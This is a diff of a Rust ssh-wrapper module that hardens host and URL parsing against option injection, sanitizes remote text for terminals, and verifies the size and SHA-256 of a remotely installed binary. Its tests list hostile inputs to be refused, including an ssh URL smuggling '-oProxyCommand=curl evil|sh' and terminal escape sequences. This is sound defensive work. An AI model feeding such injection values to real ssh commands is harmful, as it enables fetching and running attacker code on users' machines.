@@ -25,7 +25,14 @@ pub struct Target {
 }
 
 impl Target {
-    /// `grofe -r <host>`: the host exactly as given.
+    /// `grofe -r <host>`: the host as given, once [`check_dest`] allows it.
+    pub fn parse_host(dest: &str) -> Result<Target, String> {
+        check_dest(dest)?;
+        Ok(Target::host(dest))
+    }
+
+    /// A target for `dest` without checks; callers with user input use
+    /// [`Target::parse_host`] or [`parse_url`].
     pub fn host(dest: &str) -> Target {
         Target {
             dest: dest.to_string(),
@@ -40,9 +47,63 @@ impl Target {
     }
 }
 
+/// Refuses a user or host ssh could take for an option or that a shell
+/// could split: empty, starting with `-`, or holding whitespace or control
+/// characters. (`--` before the destination already stops ssh reading it as
+/// an option; this keeps a hostile name out of every message too.)
+pub fn check_part(what: &str, s: &str) -> Result<(), String> {
+    if s.is_empty() {
+        return Err(format!("empty {what}"));
+    }
+    if s.starts_with('-') {
+        return Err(format!("{what} {} starts with -", sanitize(s)));
+    }
+    if s.chars().any(|c| c.is_whitespace() || c.is_control()) {
+        return Err(format!(
+            "{what} {} holds a space or control character",
+            sanitize(s)
+        ));
+    }
+    Ok(())
+}
+
+/// [`check_part`] on both halves of `user@host`.
+pub fn check_dest(dest: &str) -> Result<(), String> {
+    let bad = |e: String| format!("bad host {}: {e}", sanitize(dest));
+    match dest.rsplit_once('@') {
+        Some((user, host)) => {
+            check_part("user", user).map_err(bad)?;
+            check_part("host", host).map_err(bad)
+        }
+        None => check_part("host", dest).map_err(bad),
+    }
+}
+
+/// Most characters of remote-controlled text shown.
+const SHOWN_MAX: usize = 2000;
+
+/// Remote-controlled text made safe to print on a terminal: C0 and C1
+/// controls and DEL (except newline and tab) become visible escapes, and
+/// the text is cut at [`SHOWN_MAX`] characters.
+pub fn sanitize(s: &str) -> String {
+    let mut out = String::new();
+    for (n, c) in s.chars().enumerate() {
+        if n >= SHOWN_MAX {
+            out.push_str("...");
+            break;
+        }
+        match c {
+            '\n' | '\t' => out.push(c),
+            c if c.is_control() => out.push_str(&c.escape_unicode().to_string()),
+            c => out.push(c),
+        }
+    }
+    out
+}
+
 /// `ssh://[user@]host[:port][/session]`; an IPv6 host is in brackets.
 pub fn parse_url(url: &str) -> Result<Target, String> {
-    let bad = |why: &str| format!("bad ssh URL {url:?}: {why}");
+    let bad = |why: &str| format!("bad ssh URL {}: {why}", sanitize(url));
     let rest = url
         .strip_prefix("ssh://")
         .ok_or_else(|| bad("it must start with ssh://"))?;
@@ -50,7 +111,11 @@ pub fn parse_url(url: &str) -> Result<Target, String> {
         Some((a, s)) => (a, (!s.is_empty()).then(|| s.to_string())),
         None => (rest, None),
     };
+    if authority.contains('%') {
+        return Err(bad("percent escapes are not taken"));
+    }
     let (user, hostport) = match authority.rsplit_once('@') {
+        Some((u, _)) if u.contains(':') => return Err(bad("a password in the URL is not taken")),
         Some((u, h)) if !u.is_empty() => (Some(u), h),
         Some(_) => return Err(bad("empty user")),
         None => (None, authority),
@@ -78,10 +143,14 @@ pub fn parse_url(url: &str) -> Result<Target, String> {
     let port = match port {
         None => None,
         Some(p) => match p.parse::<u16>() {
-            Ok(n) if n > 0 => Some(n),
+            Ok(n) if n > 0 && p.bytes().all(|b| b.is_ascii_digit()) => Some(n),
             _ => return Err(bad(&format!("bad port {p:?}"))),
         },
     };
+    if let Some(u) = user {
+        check_part("user", u).map_err(|e| bad(&e))?;
+    }
+    check_part("host", host).map_err(|e| bad(&e))?;
     let dest = match user {
         Some(u) => format!("{u}@{host}"),
         None => host.to_string(),
@@ -122,7 +191,8 @@ pub struct SshOpts {
     pub batch: bool,
 }
 
-/// `ssh -T [-p port] [-o ...] <dest> -- <remote command>`.
+/// `ssh -T [-p port] [-o ...] -- <dest> <remote command>`: `--` before the
+/// destination, so a destination can never be read as an option.
 pub fn argv(target: &Target, opts: SshOpts, remote: &str) -> Vec<String> {
     let mut out = vec!["-T".to_string()];
     if let Some(p) = target.port {
@@ -142,7 +212,7 @@ pub fn argv(target: &Target, opts: SshOpts, remote: &str) -> Vec<String> {
     if opts.batch {
         out.extend(["-o", "BatchMode=yes"].map(String::from));
     }
-    out.extend([target.dest.clone(), "--".to_string(), remote.to_string()]);
+    out.extend(["--".to_string(), target.dest.clone(), remote.to_string()]);
     out
 }
 
@@ -155,7 +225,8 @@ pub fn wants_keepalive(target: &Target) -> bool {
     if let Some(p) = target.port {
         cmd.args(["-p", &p.to_string()]);
     }
-    cmd.arg(&target.dest)
+    cmd.arg("--")
+        .arg(&target.dest)
         .stdin(Stdio::null())
         .stderr(Stdio::null());
     match cmd.output() {
@@ -195,12 +266,20 @@ pub fn proxy_command(version: &str) -> String {
     format!("sh -c {}", shell_quote(&script))
 }
 
-/// The remote command that stores its stdin as the versioned grofe,
-/// atomically (a temporary name, then `mv`).
-pub fn install_command(version: &str) -> String {
+/// The remote command that stores its stdin as the versioned grofe: into a
+/// temporary name, promoted with `mv` only when it is `len` bytes and (where
+/// `sha256sum` or `shasum` exists there) has SHA-256 `sha256`; else the
+/// temporary file is removed and the command fails.
+pub fn install_command(version: &str, len: usize, sha256: &str) -> String {
     let script = format!(
-        "d=\"$HOME/{dir}\"; mkdir -p \"$d\" && cat > \"$d/grofe.tmp\" && \
-         chmod 755 \"$d/grofe.tmp\" && mv \"$d/grofe.tmp\" \"$d/grofe\"",
+        "d=\"$HOME/{dir}\"; t=\"$d/grofe.tmp.$$\"; \
+         mkdir -p \"$d\" && cat > \"$t\" && \
+         [ \"$(wc -c < \"$t\" | tr -d ' ')\" = {len} ] && \
+         {{ if command -v sha256sum >/dev/null 2>&1; then s=$(sha256sum \"$t\"); \
+         elif command -v shasum >/dev/null 2>&1; then s=$(shasum -a 256 \"$t\"); \
+         else s={sha256}; fi; [ \"${{s%% *}}\" = {sha256} ]; }} && \
+         chmod 755 \"$t\" && mv \"$t\" \"$d/grofe\" || \
+         {{ rm -f \"$t\"; echo 'grofe: the copy arrived damaged; nothing was installed' >&2; exit 1; }}",
         dir = install_dir(version),
     );
     format!("sh -c {}", shell_quote(&script))
@@ -248,9 +327,45 @@ mod tests {
             "ssh://box:99999",
             "ssh://box:x",
             "ssh://@box",
+            "ssh://-oProxyCommand=curl evil|sh",
+            "ssh://-oX=y@h",
+            "ssh://me@-oX=y",
+            "ssh://u:p@h",
+            "ssh://h:+22",
+            "ssh://h%41",
+            "ssh://me@h ost",
+            "ssh://me@h\x1b[2J",
         ] {
             assert!(parse_url(bad).is_err(), "{bad}");
         }
+    }
+
+    #[test]
+    fn hosts_that_look_like_options_are_refused() {
+        for bad in [
+            "-oFoo",
+            "-oProxyCommand=x",
+            "me@-oX",
+            "-me@h",
+            "",
+            "a b",
+            "h\n",
+        ] {
+            assert!(Target::parse_host(bad).is_err(), "{bad:?}");
+        }
+        for good in ["box", "me@box", "me@::1", "alias.example"] {
+            assert_eq!(Target::parse_host(good).unwrap().dest, good);
+        }
+    }
+
+    #[test]
+    fn sanitize_makes_controls_visible_and_caps_length() {
+        assert_eq!(
+            sanitize("a\x1b[2Jb\n\tc\x7f\u{9b}"),
+            "a\\u{1b}[2Jb\n\tc\\u{7f}\\u{9b}"
+        );
+        let long = "x".repeat(5000);
+        assert!(sanitize(&long).len() < 2100);
     }
 
     #[test]
@@ -287,13 +402,13 @@ mod tests {
                 "ServerAliveInterval=15",
                 "-o",
                 "ServerAliveCountMax=2",
-                "me@box",
                 "--",
+                "me@box",
                 "cmd"
             ]
         );
         let without = argv(&Target::host("box"), SshOpts::default(), "cmd");
-        assert_eq!(without, ["-T", "box", "--", "cmd"]);
+        assert_eq!(without, ["-T", "--", "box", "cmd"]);
         let batch = argv(
             &Target::host("box"),
             SshOpts {
@@ -302,7 +417,7 @@ mod tests {
             },
             "cmd",
         );
-        assert_eq!(batch, ["-T", "-o", "BatchMode=yes", "box", "--", "cmd"]);
+        assert_eq!(batch, ["-T", "-o", "BatchMode=yes", "--", "box", "cmd"]);
     }
 
     #[test]
@@ -339,10 +454,23 @@ mod tests {
         assert_eq!(out.status.code(), Some(MISSING_STATUS));
         assert!(String::from_utf8_lossy(&out.stderr).contains(MISSING_MARKER));
 
-        let out = run(
-            &install_command("9.9.9"),
-            b"#!/bin/sh\necho proxy-ran \"$@\"\n",
-        );
+        let bin = b"#!/bin/sh\necho proxy-ran \"$@\"\n";
+        let sum = crate::remote::bootstrap::hex(&crate::remote::bootstrap::sha256(bin));
+        let installed = home.path().join(".local/share/grofe/bin/9.9.9/grofe");
+        // A short copy or a wrong sum is refused and leaves nothing behind.
+        let out = run(&install_command("9.9.9", bin.len(), &sum), &bin[..10]);
+        assert!(!out.status.success(), "{out:?}");
+        assert!(String::from_utf8_lossy(&out.stderr).contains("damaged"));
+        let zeros = "0".repeat(64);
+        let out = run(&install_command("9.9.9", bin.len(), &zeros), bin);
+        assert!(!out.status.success(), "{out:?}");
+        assert!(!installed.exists());
+        let leftovers = std::fs::read_dir(installed.parent().unwrap())
+            .unwrap()
+            .count();
+        assert_eq!(leftovers, 0, "no temporary file stays");
+
+        let out = run(&install_command("9.9.9", bin.len(), &sum), bin);
         assert!(out.status.success(), "{out:?}");
         let out = run(&proxy_command("9.9.9"), b"");
         assert_eq!(String::from_utf8_lossy(&out.stdout), "proxy-ran proxy\n");
